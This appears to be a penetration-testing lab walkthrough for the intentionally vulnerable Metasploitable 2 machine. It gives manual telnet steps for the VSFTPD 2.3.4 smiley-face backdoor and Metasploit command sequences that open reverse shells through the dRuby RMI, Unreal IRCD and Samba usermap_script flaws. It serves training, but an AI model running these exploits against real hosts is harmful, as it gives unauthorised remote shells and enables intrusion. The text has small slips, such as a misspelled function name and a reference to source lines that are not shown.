# Exploiting Vulnerabilities Demonstration

Lets exploit the vulnerabilities we have found on the Metasploitable 2 box.
From the initial enumeration phase, we determined the following:

* Unreal IRCD - contains a backdoor
* VSFTPD - contains a backdoor
* dRuby RMI Server 1.8 - vulnerable to RCE
* Samba 3.0.20-Debian

## Exploiting VSFTPD

This example is a good beginner vulnerability to exploit. We will begin analyzing the source code to determine how the application is vulnerable. We will then exploit the service manually first. Afterwards, we will do the same using Metasploit. Recall that the privilege level of a shell is usually based on the context of the user account running the exploited application. In practice this means you can first gain a shell with one vulnerability, then chain another vulnerability to escalate permissions.

The vulnerability itself allows for a backdoor payload to be initiated with `: )` (a smiley face) in the username. This sets up a bind shell listener on port 6200.

Reviewing the [source](http://pastebin.com/AeT0sS5):

> else if((p_str->p_buf[i]==0x3a)
> && (p_str->p_buf[i+1]==0x29))
> {
> 	vsf_sysutil_extra()	
> }

`0x3a` translates to `:` Hex -> ASCII
`0x29` translated to `)` Hex -> ASCII

If the username contains this matching code (`:)`) the `csf_sysutil_extra()` function is called. Review lines 75 - 94 above. The key importance here is that this function sets up a socket on a listening address to port 6200 and establishes a `sh`. 

### Exploiting Manually

We already determined through the code that accessing the username with `:)` calls the vulnerable function to establish a backdoor.

We can then execute the following:
```bash  
# Setup the backdoor
telnet [metasploitable 2] 21
USER user:)
PASS pass
# Escape via ^] or Ctrl + C
# Scan to verify the backdoor is listening
sudo nmap 10.11.1.250 -p6200

# Confirm access
telnet 10.11.1.250 6200

# Verify user
id
```

### Exploiting with Metasploit

```bash
# Start msfconsole
msfconsole

# Select the exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# List options - we only need a remote host for this
show options

# Show list of available payloads
show payloads

# There is only a single payload here
set payload cmd/unix/interact

# Set Remote Host RHOST
set rhosts 10.11.1.250

# Launch the exploit
run

## Sometimes it is necessary to run the exploit twice.
```

## Exploiting dRuby RMI Server 1.8

dRuby is a distributed object system written in Ruby. It uses its own protocol and binds itself to a URI like `druby://example.com` on port 8787.

:grey_exclamation:  - This exploit has been removed from the Metasploit Framework - while the service is still vulnerable it cannot be exploited with Metasploit.

```bash
# Start msfconsole
msfconsole

# Since we already know the name of the exploit:
search name:Distributed Ruby Send instance_eval/syscall Code Execution

# Select the exploit
use exploit/linux/misc/drb_remote_codeexec

# Set the payload
set payload cmd/unix/reverse_ruby

# Check options
show options

# Set the listening host
set lhost [IP ATTACK BOX] 
# or set by the VPN network interface
set lhost ppp0 

# Set the URI
set URI druby://[TARGET IP]:8787

# Launch
run
```

## Exploiting Unreal IRCD 3.2.8.1

```bash
# Start msfconsole
msfconsole

# Find the the right exploit to use
search unreal ircd

# Select the appropriate exploit
use exploit/unix/irc/unreal_ircd_3281_backdoor

# Determine what payloads are available
show payloads

# Set the payload we want
set payload cmd/unix/reverse_perl

# See what options are required
show options

# Set the remote host
set rhosts [IP target]

# Set the local host 
set lhost [IP attack box] or set lhost ppp0

# Launch the exploit
exploit
```

## Exploiting Samba 3.0.20-Debian

```bash
# Start msfconsole
msfconsole

# Select the usermap script module ??? How do we know this?
use multi/samba/usermap_script

# Set the target
set rhosts [target IP]

# Set payload
set payload cmd/unix/reverse

# Set the listener
set lhost ppp0
set lport 4444

# Launch the exploit
run
```

